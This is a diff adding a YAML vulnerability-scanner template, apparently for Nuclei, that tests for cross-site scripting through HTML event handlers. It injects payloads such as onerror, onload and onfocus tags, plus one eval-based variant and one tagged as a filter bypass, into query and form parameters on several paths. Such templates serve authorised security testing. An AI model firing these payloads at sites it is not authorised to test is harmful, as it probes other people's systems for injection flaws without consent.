@@ -1,0 +1,47 @@
+id: xss-p2
+
+info:
+  name: XSS - Event Handler Based
+  author: custom
+  severity: medium
+  description: XSS using HTML event handlers (onerror, onload, etc.)
+  tags: xss,waf-bypass,event-handler
+
+http:
+  - raw:
+      - |
+        GET /{{path}}?q={{payload}} HTTP/1.1
+        Host: {{Hostname}}
+        
+      - |
+        POST /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        q={{payload}}
+
+    payloads:
+      payload:
+        - "<img src=x onerror=alert(1)>"
+        - "<img src=x onerror=alert(1)//"
+        - "<svg/onload=alert(1)>"
+        - "<body onload=alert(1)>"
+        - "<input onfocus=alert(1) autofocus>"
+        - "<select onchange=alert(1)>"
+        - "<textarea oninput=alert(1)>"
+        - "<img src=x:alert(1) onerror=eval(src)>"
+        - '<img src="/" =_= title="onerror=\'prompt(1)\'">'
+      path:
+        - "profile"
+        - "message"
+        - "post"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "onerror"
+          - "onload"
+          - "onfocus"
+        condition: or
